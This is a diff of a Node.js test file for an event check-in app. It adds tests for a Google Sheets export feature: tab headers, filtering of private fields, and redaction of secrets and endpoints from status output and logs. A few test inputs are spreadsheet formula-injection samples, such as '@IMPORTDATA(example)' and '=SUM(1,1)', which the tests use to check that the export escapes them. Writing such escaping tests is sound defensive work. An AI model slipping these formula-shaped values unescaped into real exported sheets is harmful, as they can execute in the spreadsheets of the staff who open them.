@@ -9,9 +9,17 @@ const { once } = require("events");
 const testDb = path.join(os.tmpdir(), `event-app-test-${process.pid}.json`);
 process.env.EVENT_APP_DB_PATH = testDb;
 process.env.EVENT_APP_ORGANIZER_KEY = "test-organizer-key";
+delete process.env.EVENT_APP_SHEETS_EXPORT_URL;
+delete process.env.EVENT_APP_SHEETS_EXPORT_KEY;
 
 const { server, startServer } = require("../server");
 const { TRIVIA_QUESTIONS } = require("../trivia-questions");
+const {
+  TAB_HEADERS,
+  buildExportSnapshot,
+  createGoogleSheetsExporter,
+  normalizedCell,
+} = require("../google-sheets-export");
 const EXPECTED_NEW_SONG_CHOICES = Object.freeze([
   "He Called Me — Eugy Official",
   "He Turned It",
@@ -24,6 +32,41 @@ const EXPECTED_NEW_SONG_CHOICES = Object.freeze([
   "Amen — Madison Ryann Ward",
   "Quick — Caleb Gordon",
   "Goodbye Yesterday — Elevation Rhythm",
+]);
+const EXPECTED_SHEETS_TAB_HEADERS = Object.freeze({
+  Attendees: Object.freeze([
+    "attendeeId", "aliasIds", "name", "phone", "raffleNumber", "wristbandColor",
+    "registeredAt", "wristbandConfirmedAt", "phase3CompletedAt", "completedBoothIds",
+    "completedBoothCount", "signupOptionIds",
+  ]),
+  BoothResults: Object.freeze([
+    "id", "attendeeId", "name", "phone", "raffleNumber", "wristbandColor", "boothId",
+    "boothName", "checkedInBy", "checkedInAt", "sessionNumber", "runId", "runNumber",
+    "score", "correctCount", "answeredCount", "totalQuestions", "votedFor",
+    "featuredWinner", "extraData",
+  ]),
+  SignUps: Object.freeze([
+    "id", "attendeeId", "name", "phone", "raffleNumber", "wristbandColor", "optionId",
+    "optionTitle", "submittedAt", "confirmedInPerson", "confirmedBy", "confirmedAt",
+  ]),
+  TriviaAnswers: Object.freeze([
+    "id", "attendeeId", "name", "raffleNumber", "wristbandColor", "sessionNumber",
+    "runId", "runNumber", "questionId", "questionNumber", "answerIndex", "isCorrect",
+    "answeredAt",
+  ]),
+  HeavenConfirmations: Object.freeze([
+    "id", "attendeeId", "name", "raffleNumber", "wristbandColor", "sessionNumber",
+    "runId", "runNumber", "action", "confirmedAt",
+  ]),
+  SongVotes: Object.freeze([
+    "id", "attendeeId", "name", "raffleNumber", "wristbandColor", "sessionNumber",
+    "runId", "runNumber", "songTitle", "votedAt", "updatedAt",
+  ]),
+  ExportMeta: Object.freeze(["key", "value"]),
+});
+const EXPECTED_SHEETS_STATUS_KEYS = Object.freeze([
+  "configured", "lastAttemptAt", "lastError", "lastRowCounts", "lastSuccessAt",
+  "nextRetryAt", "pending", "state", "syncing",
 ]);
 
 function request(port, action, payload, method = "POST") {
@@ -112,6 +155,369 @@ function runInlineScriptSyntaxRegression() {
     while ((match = inlineScript.exec(source))) {
       new vm.Script(match[1], { filename });
     }
+  });
+}
+
+function googleSheetsExportFixture() {
+  return {
+    dataResetAt: "2026-07-18T19:00:00.000Z",
+    attendees: [
+      {
+        attendeeId: "attendee-formula",
+        aliasIds: ["attendee-alias"],
+        name: "=SUM(1,1)",
+        phone: "6155550101",
+        raffleNumber: "1001",
+        wristbandColor: "blue",
+        registeredAt: "2026-07-18T19:01:00.000Z",
+        wristbandConfirmedAt: "2026-07-18T19:02:00.000Z",
+        phase3CompletedAt: null,
+        note: "This attendee-only note must not become a Sheet column.",
+      },
+      {
+        attendeeId: "attendee-no-thanks",
+        aliasIds: [],
+        name: "No Thanks Guest",
+        phone: "",
+        raffleNumber: "1002",
+        wristbandColor: "red",
+        registeredAt: "2026-07-18T19:03:00.000Z",
+        wristbandConfirmedAt: "2026-07-18T19:04:00.000Z",
+        phase3CompletedAt: "2026-07-18T21:11:00.000Z",
+      },
+    ],
+    boothCheckins: [
+      {
+        id: "checkin-1",
+        attendeeId: "attendee-alias",
+        name: "Stale alias name",
+        phone: "6155550101",
+        boothId: "trivia",
+        boothName: "Bible Bowl",
+        checkedInBy: "self",
+        checkedInAt: "2026-07-18T20:29:00.000Z",
+        rating: 5,
+        note: "=private booth feedback",
+        extraData: {
+          sessionNumber: 1,
+          runId: "trivia-session-1-run-2",
+          runNumber: 2,
+          score: 9,
+          correctCount: 9,
+          answeredCount: 10,
+          totalQuestions: 15,
+          votedFor: "Victory",
+          featuredWinner: "Victory",
+          promptShown: "A controlled booth prompt",
+          reachedBeat: "closing",
+          answers: { privateStoryAnswer: "Do not mirror this free text." },
+          reflections: { privateArtReflection: "Do not mirror this either." },
+        },
+      },
+    ],
+    signups: [
+      {
+        id: "signup-1",
+        attendeeId: "attendee-formula",
+        name: "Stale signup name",
+        phone: "6155550101",
+        optionId: "future",
+        optionTitle: "+Keep me posted",
+        submittedAt: "2026-07-18T21:12:00.000Z",
+        confirmedInPerson: true,
+        confirmedBy: "staff",
+        confirmedAt: "2026-07-18T21:13:00.000Z",
+        stars: 5,
+        comment: "Do not export this legacy feedback.",
+      },
+    ],
+    triviaAnswers: [
+      {
+        id: "answer-1",
+        attendeeId: "attendee-alias",
+        sessionNumber: 1,
+        runId: "trivia-session-1-run-2",
+        runNumber: 2,
+        questionId: "question-3",
+        questionNumber: 3,
+        answerIndex: 1,
+        isCorrect: true,
+        answeredAt: "2026-07-18T20:20:00.000Z",
+      },
+    ],
+    heavenConfirmations: [
+      {
+        id: "heaven-confirmation-1",
+        attendeeId: "attendee-no-thanks",
+        sessionNumber: 2,
+        runId: "heaven-session-2-run-1",
+        runNumber: 1,
+        action: "drawing_complete",
+        confirmedAt: "2026-07-18T20:35:00.000Z",
+      },
+    ],
+    songVotes: [
+      {
+        id: "song-vote-1",
+        attendeeId: "attendee-formula",
+        sessionNumber: 3,
+        runId: "newsong-session-3-run-1",
+        runNumber: 1,
+        songTitle: "@Anthem",
+        votedAt: "2026-07-18T20:55:00.000Z",
+        updatedAt: "2026-07-18T20:55:00.000Z",
+      },
+    ],
+  };
+}
+
+function sheetRowObject(snapshot, tabName, rowIndex = 0) {
+  const selected = snapshot.tabs[tabName];
+  return Object.fromEntries(selected.headers.map((header, index) => [header, selected.rows[rowIndex][index]]));
+}
+
+function sheetDataRowCounts(snapshot) {
+  return Object.fromEntries(Object.entries(snapshot.tabs)
+    .filter(([name]) => name !== "ExportMeta")
+    .map(([name, selected]) => [name, selected.rows.length]));
+}
+
+async function runGoogleSheetsExporterRegression() {
+  assert.deepEqual(TAB_HEADERS, EXPECTED_SHEETS_TAB_HEADERS);
+  assert.deepEqual(Object.keys(TAB_HEADERS), [
+    "Attendees", "BoothResults", "SignUps", "TriviaAnswers",
+    "HeavenConfirmations", "SongVotes", "ExportMeta",
+  ]);
+
+  assert.equal(normalizedCell("=1+1"), "'=1+1");
+  assert.equal(normalizedCell(" +SUM(A1:A2)"), "' +SUM(A1:A2)");
+  assert.equal(normalizedCell("-2+3"), "'-2+3");
+  assert.equal(normalizedCell("@IMPORTDATA(example)"), "'@IMPORTDATA(example)");
+  assert.equal(normalizedCell("\tformula-shaped"), "'\tformula-shaped");
+  assert.equal(normalizedCell("ordinary text"), "ordinary text");
+  assert.equal(normalizedCell(42), 42);
+
+  const fixture = googleSheetsExportFixture();
+  const generatedAt = "2026-07-18T22:00:00.000Z";
+  const snapshot = buildExportSnapshot(fixture, { generatedAt });
+  assert.equal(snapshot.generatedAt, generatedAt);
+  assert.equal(snapshot.dataResetAt, fixture.dataResetAt);
+  assert.deepEqual(Object.keys(snapshot.tabs), Object.keys(EXPECTED_SHEETS_TAB_HEADERS));
+  Object.entries(EXPECTED_SHEETS_TAB_HEADERS).forEach(([name, headers]) => {
+    assert.deepEqual(snapshot.tabs[name].headers, headers, `${name} headers should remain stable`);
+  });
+
+  const flattenedHeaders = Object.values(snapshot.tabs).flatMap((selected) => selected.headers);
+  ["rating", "note", "stars", "comment"].forEach((feedbackField) => {
+    assert.equal(flattenedHeaders.includes(feedbackField), false, `${feedbackField} must not be exported`);
+  });
+
+  const expectedCounts = {
+    Attendees: 2,
+    BoothResults: 1,
+    SignUps: 1,
+    TriviaAnswers: 1,
+    HeavenConfirmations: 1,
+    SongVotes: 1,
+  };
+  assert.deepEqual(sheetDataRowCounts(snapshot), expectedCounts);
+  const repeatedSnapshot = buildExportSnapshot(JSON.parse(JSON.stringify(fixture)), {
+    generatedAt: "2026-07-18T22:01:00.000Z",
+  });
+  assert.deepEqual(sheetDataRowCounts(repeatedSnapshot), expectedCounts);
+
+  const formulaAttendee = sheetRowObject(snapshot, "Attendees", 0);
+  assert.equal(formulaAttendee.attendeeId, "attendee-formula");
+  assert.equal(formulaAttendee.aliasIds, '["attendee-alias"]');
+  assert.equal(formulaAttendee.name, "'=SUM(1,1)");
+  assert.equal(formulaAttendee.completedBoothIds, '["trivia"]');
+  assert.equal(formulaAttendee.completedBoothCount, 1);
+  assert.equal(formulaAttendee.signupOptionIds, '["future"]');
+
+  const noThanksAttendee = sheetRowObject(snapshot, "Attendees", 1);
+  assert.equal(noThanksAttendee.phase3CompletedAt, "2026-07-18T21:11:00.000Z");
+  assert.equal(noThanksAttendee.signupOptionIds, "[]");
+  assert.equal(noThanksAttendee.completedBoothCount, 0);
+  assert.equal(snapshot.tabs.SignUps.rows.length, 1, "No-thanks completion must not create a SignUps row");
+
+  const boothResult = sheetRowObject(snapshot, "BoothResults");
+  assert.equal(boothResult.attendeeId, "attendee-formula", "alias check-in should map to its canonical attendee");
+  assert.equal(boothResult.name, "'=SUM(1,1)");
+  assert.equal(boothResult.raffleNumber, "1001");
+  assert.equal(boothResult.wristbandColor, "blue");
+  assert.equal(boothResult.sessionNumber, 1);
+  assert.equal(boothResult.runId, "trivia-session-1-run-2");
+  assert.equal(boothResult.score, 9);
+  assert.equal(boothResult.correctCount, 9);
+  assert.equal(boothResult.answeredCount, 10);
+  assert.equal(boothResult.totalQuestions, 15);
+  assert.equal(boothResult.votedFor, "Victory");
+  assert.equal(boothResult.featuredWinner, "Victory");
+  assert.equal(boothResult.extraData.includes("controlled booth prompt"), true);
+  assert.equal(boothResult.extraData.includes("closing"), true);
+  assert.equal(boothResult.extraData.includes("private booth feedback"), false);
+  assert.equal(boothResult.extraData.includes("privateStoryAnswer"), false);
+  assert.equal(boothResult.extraData.includes("privateArtReflection"), false);
+
+  const signup = sheetRowObject(snapshot, "SignUps");
+  assert.equal(signup.name, "'=SUM(1,1)");
+  assert.equal(signup.raffleNumber, "1001");
+  assert.equal(signup.optionTitle, "'+Keep me posted");
+  assert.equal(signup.confirmedInPerson, true);
+
+  const triviaAnswer = sheetRowObject(snapshot, "TriviaAnswers");
+  assert.equal(triviaAnswer.attendeeId, "attendee-formula");
+  assert.equal(triviaAnswer.name, "'=SUM(1,1)");
+  assert.equal(triviaAnswer.questionNumber, 3);
+  assert.equal(triviaAnswer.isCorrect, true);
+
+  const heavenConfirmation = sheetRowObject(snapshot, "HeavenConfirmations");
+  assert.equal(heavenConfirmation.attendeeId, "attendee-no-thanks");
+  assert.equal(heavenConfirmation.name, "No Thanks Guest");
+  assert.equal(heavenConfirmation.action, "drawing_complete");
+
+  const songVote = sheetRowObject(snapshot, "SongVotes");
+  assert.equal(songVote.attendeeId, "attendee-formula");
+  assert.equal(songVote.name, "'=SUM(1,1)");
+  assert.equal(songVote.songTitle, "'@Anthem");
+
+  const exportMeta = Object.fromEntries(snapshot.tabs.ExportMeta.rows);
+  assert.equal(exportMeta.schemaVersion, 1);
+  assert.equal(exportMeta.generatedAt, generatedAt);
+  assert.equal(exportMeta.dataResetAt, fixture.dataResetAt);
+  Object.entries(expectedCounts).forEach(([name, count]) => {
+    assert.equal(exportMeta[`${name}.rowCount`], count);
+  });
+
+  let disabledSendCount = 0;
+  const disabledExporter = createGoogleSheetsExporter({
+    getSnapshot: googleSheetsExportFixture,
+    env: {},
+    requestJson: async () => { disabledSendCount += 1; },
+  });
+  assert.equal(disabledExporter.configured(), false);
+  disabledExporter.markDirty();
+  disabledExporter.queueImmediate();
+  const disabledStatus = await disabledExporter.flush();
+  assert.equal(disabledSendCount, 0, "disabled export must never invoke the injected sender");
+  assert.deepEqual(Object.keys(disabledStatus).sort(), EXPECTED_SHEETS_STATUS_KEYS);
+  assert.deepEqual(disabledStatus, {
+    configured: false,
+    state: "disabled",
+    pending: false,
+    syncing: false,
+    lastAttemptAt: null,
+    lastSuccessAt: null,
+    lastError: null,
+    lastRowCounts: null,
+    nextRetryAt: null,
+  });
+
+  const successfulCalls = [];
+  const exportUrl = "https://sheets-export.example.test/deployment";
+  const exportKey = "unit-test-export-secret";
+  const successfulExporter = createGoogleSheetsExporter({
+    getSnapshot: googleSheetsExportFixture,
+    env: {
+      EVENT_APP_SHEETS_EXPORT_URL: exportUrl,
+      EVENT_APP_SHEETS_EXPORT_KEY: exportKey,
+      EVENT_APP_SHEETS_EXPORT_DEBOUNCE_MS: "60000",
+    },
+    requestJson: async (...args) => { successfulCalls.push(args); return { ok: true }; },
+  });
+  successfulExporter.markDirty();
+  assert.equal(successfulExporter.status().state, "pending");
+  const successfulStatus = await successfulExporter.flush();
+  assert.equal(successfulCalls.length, 1);
+  assert.equal(successfulCalls[0][0], `${exportUrl}/importNodeSnapshot`);
+  assert.equal(successfulCalls[0][1].exportKey, exportKey);
+  assert.deepEqual(sheetDataRowCounts(successfulCalls[0][1].snapshot), expectedCounts);
+  assert.equal(successfulStatus.state, "idle");
+  assert.equal(successfulStatus.lastError, null);
+  assert.deepEqual(successfulStatus.lastRowCounts, expectedCounts);
+  assertIsoTimestamp(successfulStatus.lastAttemptAt, "export lastAttemptAt");
+  assertIsoTimestamp(successfulStatus.lastSuccessAt, "export lastSuccessAt");
+  const successfulPublicStatus = JSON.stringify(successfulStatus);
+  assert.equal(successfulPublicStatus.includes(exportUrl), false);
+  assert.equal(successfulPublicStatus.includes(exportKey), false);
+
+  let retryAttempts = 0;
+  const retryUrl = "https://retry-sheets.example.test/deployment";
+  const retryKey = "retry-export-secret";
+  const loggedErrors = [];
+  const retryingExporter = createGoogleSheetsExporter({
+    getSnapshot: googleSheetsExportFixture,
+    env: {
+      EVENT_APP_SHEETS_EXPORT_URL: retryUrl,
+      EVENT_APP_SHEETS_EXPORT_KEY: retryKey,
+      EVENT_APP_SHEETS_EXPORT_DEBOUNCE_MS: "60000",
+    },
+    logger: { error: (message) => loggedErrors.push(message) },
+    requestJson: async () => {
+      retryAttempts += 1;
+      if (retryAttempts === 1) {
+        throw new Error(`Failed sending ${retryKey} to ${retryUrl} at retry-sheets.example.test.`);
+      }
+      return { ok: true };
+    },
+  });
+  retryingExporter.markDirty();
+  const failedStatus = await retryingExporter.flush();
+  assert.equal(retryAttempts, 1);
+  assert.equal(failedStatus.state, "error");
+  assert.equal(failedStatus.pending, true);
+  assertIsoTimestamp(failedStatus.nextRetryAt, "export nextRetryAt");
+  assert.equal(failedStatus.lastError.includes("[redacted]"), true);
+  [retryKey, retryUrl, "retry-sheets.example.test"].forEach((secretValue) => {
+    assert.equal(failedStatus.lastError.includes(secretValue), false);
+    assert.equal(loggedErrors.some((message) => message.includes(secretValue)), false);
+  });
+  retryingExporter.queueImmediate();
+  const recoveredStatus = await retryingExporter.flush();
+  assert.equal(retryAttempts, 2);
+  assert.equal(recoveredStatus.state, "idle");
+  assert.equal(recoveredStatus.pending, false);
+  assert.equal(recoveredStatus.lastError, null);
+  assert.equal(recoveredStatus.nextRetryAt, null);
+  assert.deepEqual(recoveredStatus.lastRowCounts, expectedCounts);
+}
+
+async function runGoogleSheetsExportApiRegression(port) {
+  const organizerKey = "test-organizer-key";
+  let response = await request(port, "googleSheetsExportStatus", {});
+  assert.equal(response.status, 401);
+  assert.equal(response.body.code, "AUTH_REQUIRED");
+  response = await request(port, "googleSheetsExportStatus", { organizerKey: "wrong" });
+  assert.equal(response.status, 401);
+  assert.equal(response.body.code, "AUTH_REQUIRED");
+
+  response = await request(port, "googleSheetsExportStatus", { organizerKey });
+  assert.equal(response.status, 200);
+  assert.deepEqual(Object.keys(response.body).sort(), EXPECTED_SHEETS_STATUS_KEYS);
+  assert.equal(response.body.configured, false);
+  assert.equal(response.body.state, "disabled");
+  const protectedStatus = response.body;
+  ["url", "endpoint", "key", "secret", "exportKey"].forEach((field) => {
+    assert.equal(Object.prototype.hasOwnProperty.call(protectedStatus, field), false);
+  });
+
+  response = await request(port, "syncGoogleSheetsExport", {});
+  assert.equal(response.status, 401);
+  assert.equal(response.body.code, "AUTH_REQUIRED");
+  response = await request(port, "syncGoogleSheetsExport", { organizerKey: "wrong" });
+  assert.equal(response.status, 401);
+  assert.equal(response.body.code, "AUTH_REQUIRED");
+  response = await request(port, "syncGoogleSheetsExport", { organizerKey });
+  assert.equal(response.status, 409);
+  assert.equal(response.body.code, "GOOGLE_SHEETS_EXPORT_NOT_CONFIGURED");
+
+  response = await request(port, "dashboardData", { organizerKey });
+  assert.equal(response.status, 200);
+  assert.deepEqual(response.body.googleSheetsExport, protectedStatus);
+  assert.deepEqual(Object.keys(response.body.googleSheetsExport).sort(), EXPECTED_SHEETS_STATUS_KEYS);
+  const dashboardExportText = JSON.stringify(response.body.googleSheetsExport).toLowerCase();
+  ["webhook", "endpoint", "exportkey", "secret"].forEach((forbidden) => {
+    assert.equal(dashboardExportText.includes(forbidden), false);
   });
 }
 
@@ -237,9 +643,9 @@ async function runApiRegression(port) {
   // Booth presentation state is public and PII-free. Each booth starts with
   // an independent waiting state; only an authenticated organizer can change
   // the state for the booth they name.
-  res = await request(port, "boothPresentation", { boothId: "art" });
+  res = await request(port, "boothPresentation", { boothId: "story" });
   assert.equal(res.status, 200);
-  assert.equal(res.body.boothId, "art");
+  assert.equal(res.body.boothId, "story");
   assert.equal(res.body.stepIndex, 0);
   assert.equal(res.body.status, "waiting");
   assert.equal(res.body.message, "");
@@ -253,29 +659,29 @@ async function runApiRegression(port) {
   assert.equal(res.status, 404);
   assert.equal(res.body.code, "BOOTH_NOT_FOUND");
   res = await request(port, "updateBoothPresentation", {
-    boothId: "art", stepIndex: 1, status: "live", message: "Begin", organizerKey: "wrong",
+    boothId: "story", stepIndex: 1, status: "live", message: "Begin", organizerKey: "wrong",
   });
   assert.equal(res.status, 401);
   assert.equal(res.body.code, "AUTH_REQUIRED");
   res = await request(port, "updateBoothPresentation", {
-    boothId: "art", stepIndex: 1, status: "not-a-status", message: "Begin", organizerKey,
+    boothId: "story", stepIndex: 1, status: "not-a-status", message: "Begin", organizerKey,
   });
   assert.equal(res.status, 400);
   assert.equal(res.body.code, "INVALID_PRESENTATION_STATUS");
   res = await request(port, "updateBoothPresentation", {
-    boothId: "art", stepIndex: 1, status: "live", message: "x".repeat(501), organizerKey,
+    boothId: "story", stepIndex: 1, status: "live", message: "x".repeat(501), organizerKey,
   });
   assert.equal(res.status, 400);
   assert.equal(res.body.code, "INVALID_PRESENTATION_MESSAGE");
 
   res = await request(port, "updateBoothPresentation", {
-    boothId: "art", stepIndex: 2, status: "live", message: "  Start drawing now.  ", organizerKey,
+    boothId: "story", stepIndex: 2, status: "live", message: "  Start the story now.  ", organizerKey,
   });
   assert.equal(res.status, 200);
-  assert.equal(res.body.boothId, "art");
+  assert.equal(res.body.boothId, "story");
   assert.equal(res.body.stepIndex, 2);
   assert.equal(res.body.status, "live");
-  assert.equal(res.body.message, "Start drawing now.");
+  assert.equal(res.body.message, "Start the story now.");
   assert.equal(res.body.version, 1);
   assertIsoTimestamp(res.body.createdAt, "presentation createdAt");
   assertIsoTimestamp(res.body.updatedAt, "presentation updatedAt");
@@ -283,7 +689,7 @@ async function runApiRegression(port) {
   const presentationCreatedAt = res.body.createdAt;
 
   res = await request(port, "updateBoothPresentation", {
-    boothId: "art", stepIndex: 4, status: "wrap", message: "Stale", version: 0, organizerKey,
+    boothId: "story", stepIndex: 4, status: "wrap", message: "Stale", version: 0, organizerKey,
   });
   assert.equal(res.status, 409);
   assert.equal(res.body.code, "PRESENTATION_CONFLICT");
@@ -294,7 +700,7 @@ async function runApiRegression(port) {
   assert.equal(res.body.version, 0);
   assert.equal(res.body.status, "waiting");
   res = await request(port, "updateBoothPresentation", {
-    boothId: "art", stepIndex: 3, status: "paused", message: "Hold here.", version: 1, organizerKey,
+    boothId: "story", stepIndex: 3, status: "paused", message: "Hold here.", version: 1, organizerKey,
   });
   assert.equal(res.status, 200);
   assert.equal(res.body.version, 2);
@@ -442,8 +848,8 @@ async function runApiRegression(port) {
   res = await request(port, "boothCheckin", {
     attendeeId: "entry-a",
     phone: "6155550101",
-    boothId: "art",
-    boothName: "Art Therapy Table",
+    boothId: "story",
+    boothName: "The Sower, Live",
     checkedInBy: "staff-kiosk",
   });
   assert.equal(res.status, 401);
@@ -451,47 +857,47 @@ async function runApiRegression(port) {
   res = await request(port, "boothCheckin", {
     attendeeId: "entry-a",
     phone: "6155550101",
-    boothId: "art",
-    boothName: "Art Therapy Table",
+    boothId: "story",
+    boothName: "The Sower, Live",
     checkedInBy: "staff-kiosk",
     organizerKey,
   });
   assert.equal(res.status, 200);
-  const artCheckinId = res.body.checkinId;
-  const originalArtCheckedInAt = "2026-07-18T20:10:00.000Z";
-  const dbWithArtCheckin = JSON.parse(fs.readFileSync(testDb, "utf8"));
-  dbWithArtCheckin.boothCheckins.find((checkin) => checkin.id === artCheckinId).checkedInAt = originalArtCheckedInAt;
-  fs.writeFileSync(testDb, JSON.stringify(dbWithArtCheckin, null, 2));
+  const storyCheckinId = res.body.checkinId;
+  const originalStoryCheckedInAt = "2026-07-18T20:10:00.000Z";
+  const dbWithStoryCheckin = JSON.parse(fs.readFileSync(testDb, "utf8"));
+  dbWithStoryCheckin.boothCheckins.find((checkin) => checkin.id === storyCheckinId).checkedInAt = originalStoryCheckedInAt;
+  fs.writeFileSync(testDb, JSON.stringify(dbWithStoryCheckin, null, 2));
 
   res = await request(port, "boothCheckin", {
     attendeeId: "entry-a",
     phone: "6155550101",
-    boothId: "art",
-    boothName: "Art Therapy Table",
+    boothId: "story",
+    boothName: "The Sower, Live",
     checkedInBy: "self",
     rating: 4,
   });
   assert.equal(res.status, 200);
-  assert.equal(res.body.checkinId, artCheckinId);
+  assert.equal(res.body.checkinId, storyCheckinId);
   assert.equal(res.body.updated, true);
-  const artRows = JSON.parse(fs.readFileSync(testDb, "utf8")).boothCheckins
-    .filter((checkin) => checkin.attendeeId === "entry-a" && checkin.boothId === "art");
-  assert.equal(artRows.length, 1);
-  assert.equal(artRows[0].rating, 4);
-  assert.equal(artRows[0].checkedInAt, originalArtCheckedInAt);
+  const storyRows = JSON.parse(fs.readFileSync(testDb, "utf8")).boothCheckins
+    .filter((checkin) => checkin.attendeeId === "entry-a" && checkin.boothId === "story");
+  assert.equal(storyRows.length, 1);
+  assert.equal(storyRows[0].rating, 4);
+  assert.equal(storyRows[0].checkedInAt, originalStoryCheckedInAt);
   res = await request(port, "boothCheckin", {
     attendeeId: "entry-a",
-    boothId: "art",
-    boothName: "Art Therapy Table",
+    boothId: "story",
+    boothName: "The Sower, Live",
     checkedInBy: "scheduled-attendee",
     extraData: { sessionNumber: 2, wristbandColor: "blue" },
   });
   assert.equal(res.status, 200);
-  const mergedArtRow = JSON.parse(fs.readFileSync(testDb, "utf8")).boothCheckins
-    .find((checkin) => checkin.attendeeId === "entry-a" && checkin.boothId === "art");
-  assert.equal(mergedArtRow.rating, 4);
-  assert.equal(mergedArtRow.extraData.sessionNumber, 2);
-  assert.equal(mergedArtRow.checkedInAt, originalArtCheckedInAt);
+  const mergedStoryRow = JSON.parse(fs.readFileSync(testDb, "utf8")).boothCheckins
+    .find((checkin) => checkin.attendeeId === "entry-a" && checkin.boothId === "story");
+  assert.equal(mergedStoryRow.rating, 4);
+  assert.equal(mergedStoryRow.extraData.sessionNumber, 2);
+  assert.equal(mergedStoryRow.checkedInAt, originalStoryCheckedInAt);
 
   res = await request(port, "myCheckins", { phone: "6155550101" });
   assert.equal(res.status, 400);
@@ -499,7 +905,7 @@ async function runApiRegression(port) {
   assert.equal("attendee" in res.body, false);
 
   res = await request(port, "myCheckins", { attendeeId: "entry-a" });
-  assert.deepEqual(res.body.boothIds, ["art"]);
+  assert.deepEqual(res.body.boothIds, ["story"]);
   assert.deepEqual(Object.keys(res.body), ["boothIds"]);
 
   // A visitor who truly skipped entry can be created explicitly at a kiosk.
@@ -566,20 +972,20 @@ async function runApiRegression(port) {
   assert.deepEqual(res.body.optionIds, []);
   assert.equal(res.body.completedAt, kioskPhase3CompletedAt);
 
-  res = await request(port, "boothDashboardData", { boothId: "art", organizerKey: "wrong" });
+  res = await request(port, "boothDashboardData", { boothId: "story", organizerKey: "wrong" });
   assert.equal(res.status, 401);
   assert.equal(res.body.code, "AUTH_REQUIRED");
   res = await request(port, "boothDashboardData", { boothId: "unknown", organizerKey });
   assert.equal(res.status, 404);
   assert.equal(res.body.code, "BOOTH_NOT_FOUND");
-  res = await request(port, "boothDashboardData", { boothId: "art", organizerKey });
+  res = await request(port, "boothDashboardData", { boothId: "story", organizerKey });
   assert.equal(res.status, 200);
-  assert.equal(res.body.boothId, "art");
+  assert.equal(res.body.boothId, "story");
   assert.equal(res.body.totalCheckins, 1);
   assert.deepEqual(res.body.recentCheckins.map((checkin) => checkin.name), ["Avery"]);
   assert.equal("phone" in res.body.recentCheckins[0], false);
   assert.equal("signups" in res.body, false);
-  assert.equal(res.body.presentation.boothId, "art");
+  assert.equal(res.body.presentation.boothId, "story");
   assert.equal(res.body.presentation.stepIndex, 3);
   assert.equal(res.body.presentation.status, "paused");
   assert.equal(res.body.presentation.message, "Hold here.");
@@ -801,6 +1207,11 @@ async function runApiRegression(port) {
   assert.equal(newSongArtwork.status, 200);
   assert.equal(newSongArtwork.headers["content-type"], "image/webp");
   assert.ok(newSongArtwork.body.length > 1000, "New Song verse artwork should not be empty");
+
+  const artTherapyArtwork = await getPage(port, "/assets/art-therapy-heart-and-mind.jpeg");
+  assert.equal(artTherapyArtwork.status, 200);
+  assert.equal(artTherapyArtwork.headers["content-type"], "image/jpeg");
+  assert.ok(artTherapyArtwork.body.length > 10000, "Art Therapy artwork should not be empty");
 
   res = await request(port, "dashboardData", undefined, "GET");
   assert.equal(res.status, 404);
@@ -1619,6 +2030,465 @@ async function runHeavenApiRegression(port) {
   assert.deepEqual(resetDb.heavenRunHistory, []);
 }
 
+async function runArtApiRegression(port) {
+  const organizerKey = "test-organizer-key";
+  const sessionSummary = (dashboard, sessionNumber) => (
+    dashboard.sessions.find((session) => session.sessionNumber === sessionNumber)
+  );
+  const advance = (sessionNumber, action, version, key = organizerKey) => request(
+    port,
+    "advanceArtSession",
+    { sessionNumber, action, version, organizerKey: key }
+  );
+  const setSessionClock = (sessionNumber) => request(port, "setDemoClock", {
+    mode: `session${sessionNumber}`,
+    targetIso: [
+      "2026-07-18T20:15:00.000Z",
+      "2026-07-18T20:35:00.000Z",
+      "2026-07-18T20:55:00.000Z",
+    ][sessionNumber - 1],
+    organizerKey,
+  });
+  const transitions = [
+    ["start", "definition"],
+    ["show_importance", "importance"],
+    ["show_purpose_image", "purpose_image"],
+    ["ask_heart", "heart_question"],
+    ["show_proverbs", "proverbs"],
+    ["show_philippians", "philippians"],
+    ["start_art", "create"],
+    ["show_finished", "finished"],
+    ["finish", "complete"],
+  ];
+
+  let res = await request(port, "resetDemo", { organizerKey });
+  assert.equal(res.status, 200);
+
+  async function registerArtAttendee(attendeeId, name, wristbandColor) {
+    const registration = await request(port, "registerAttendee", { attendeeId, name });
+    assert.equal(registration.status, 200);
+    const confirmation = await request(port, "confirmWristband", { attendeeId, wristbandColor });
+    assert.equal(confirmation.status, 200);
+    return registration.body;
+  }
+
+  await registerArtAttendee("art-orange-a", "Orange Creator", "orange");
+  await registerArtAttendee("art-orange-b", "Orange Painter", "orange");
+  await registerArtAttendee("art-green-a", "Green Creator", "green");
+  await registerArtAttendee("art-red-a", "Red Creator", "red");
+  await registerArtAttendee("art-blue-a", "Blue Visitor", "blue");
+
+  // Art Therapy follows the same shared twenty-minute clock as every other
+  // booth. Staff can prepare the three rotations at any time, but public
+  // attendee state and completion remain closed outside an active session.
+  res = await request(port, "setDemoClock", {
+    mode: "before",
+    targetIso: "2026-07-18T20:05:00.000Z",
+    organizerKey,
+  });
+  assert.equal(res.status, 200);
+  res = await request(port, "artState", { attendeeId: "art-orange-a" });
+  assert.equal(res.status, 409);
+  assert.equal(res.body.code, "ART_SESSION_CLOSED");
+  res = await request(port, "completeArt", { attendeeId: "art-orange-a" });
+  assert.equal(res.status, 409);
+  assert.equal(res.body.code, "ART_SESSION_CLOSED");
+
+  res = await setSessionClock(1);
+  assert.equal(res.status, 200);
+
+  // Every staff read/write is protected. All rotations begin as independent
+  // run-1 welcome screens mapped from the wristband route configuration.
+  res = await request(port, "artDashboardData", { organizerKey: "wrong" });
+  assert.equal(res.status, 401);
+  assert.equal(res.body.code, "AUTH_REQUIRED");
+  res = await advance(1, "start", 0, "wrong");
+  assert.equal(res.status, 401);
+  assert.equal(res.body.code, "AUTH_REQUIRED");
+  res = await request(port, "resetArtSession", {
+    sessionNumber: 1,
+    version: 0,
+    organizerKey: "wrong",
+  });
+  assert.equal(res.status, 401);
+  assert.equal(res.body.code, "AUTH_REQUIRED");
+
+  res = await request(port, "artDashboardData", { organizerKey });
+  assert.equal(res.status, 200);
+  assert.equal(res.body.sessions.length, 3);
+  assert.deepEqual(
+    res.body.sessions.map((session) => [
+      session.sessionNumber,
+      session.assignedColor.id,
+      session.state.phase,
+      session.state.runNumber,
+      session.state.version,
+      session.assignedCount,
+      session.participantCount,
+      session.completedCount,
+      session.archivedRuns.length,
+    ]),
+    [
+      [1, "orange", "welcome", 1, 0, 2, 0, 0, 0],
+      [2, "green", "welcome", 1, 0, 1, 0, 0, 0],
+      [3, "red", "welcome", 1, 0, 1, 0, 0, 0],
+    ]
+  );
+  assert.deepEqual(
